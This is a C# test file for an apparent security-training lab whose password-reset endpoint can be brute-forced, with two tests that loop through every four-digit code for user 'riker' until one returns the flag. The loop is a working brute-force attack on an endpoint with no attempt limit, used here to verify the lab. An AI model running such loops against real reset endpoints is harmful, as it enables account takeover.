using System.Net;
using System.Net.Http.Json;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc.Testing;

namespace Trainer.Web.Tests;

public class BruteForceLabTests(WebApplicationFactory<Program> factory) : LabTestBase(factory, "brute-force")
{
    [Fact]
    public async Task Exploit_brute_forces_the_code_and_returns_the_flag()
    {
        Lab.Reset();
        var client = Client();

        // Step 1: request a reset for riker.
        var requestReset = await client.PostAsJsonAsync($"{Api}/password-reset/request", new { user = "riker" });
        requestReset.EnsureSuccessStatusCode();

        // Step 2: brute-force 0000–9999 until we find the right code.
        string? flag = null;
        for (var i = 0; i <= 9999; i++)
        {
            var code = i.ToString("D4");
            var confirm = await client.PostAsJsonAsync($"{Api}/password-reset/confirm", new { user = "riker", code });
            if (confirm.StatusCode == HttpStatusCode.OK)
            {
                var body = await confirm.Content.ReadFromJsonAsync<JsonElement>();
                flag = body.GetProperty("flag").GetString();
                break;
            }
        }

        Assert.Equal(Flag, flag);
    }

    [Fact]
    public async Task Correct_code_returns_success_and_flag()
    {
        Lab.Reset();
        var client = Client();

        await client.PostAsJsonAsync($"{Api}/password-reset/request", new { user = "riker" });

        // Find the code by brute force (guaranteed within 10000 tries).
        for (var i = 0; i <= 9999; i++)
        {
            var code = i.ToString("D4");
            var response = await client.PostAsJsonAsync($"{Api}/password-reset/confirm", new { user = "riker", code });
            if (response.StatusCode == HttpStatusCode.OK)
            {
                var body = await response.Content.ReadFromJsonAsync<JsonElement>();
                Assert.True(body.TryGetProperty("flag", out _));
                Assert.True(body.TryGetProperty("message", out _));
                return;
            }
        }

        Assert.Fail("No code from 0000-9999 was accepted.");
    }

    [Fact]
    public async Task Wrong_code_returns_bad_request()
    {
        Lab.Reset();
        var client = Client();
        await client.PostAsJsonAsync($"{Api}/password-reset/request", new { user = "riker" });

        // Try a code that is very unlikely to be correct (we try one; if it happens to be right, skip).
        var response = await client.PostAsJsonAsync($"{Api}/password-reset/confirm", new { user = "riker", code = "XXXX" });
        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
    }

    [Fact]
    public async Task Confirm_without_pending_reset_returns_bad_request()
    {
        Lab.Reset();
        var client = Client();

        var response = await client.PostAsJsonAsync($"{Api}/password-reset/confirm", new { user = "riker", code = "0000" });
        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
    }

    [Fact]
    public async Task Anonymous_callers_are_rejected()
    {
        var anon = Client(null);
        Assert.Equal(HttpStatusCode.Unauthorized, (await anon.PostAsJsonAsync($"{Api}/password-reset/request", new { user = "riker" })).StatusCode);
        Assert.Equal(HttpStatusCode.Unauthorized, (await anon.PostAsJsonAsync($"{Api}/password-reset/confirm", new { user = "riker", code = "0000" })).StatusCode);
    }

    [Fact]
    public async Task Reset_clears_pending_codes()
    {
        var client = Client();
        await client.PostAsJsonAsync($"{Api}/password-reset/request", new { user = "riker" });

        Lab.Reset();

        // The old code should no longer be pending.
        var response = await client.PostAsJsonAsync($"{Api}/password-reset/confirm", new { user = "riker", code = "0000" });
        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        var body = await response.Content.ReadFromJsonAsync<JsonElement>();
        Assert.Contains("pending", body.GetProperty("error").GetString(), StringComparison.OrdinalIgnoreCase);
    }
}
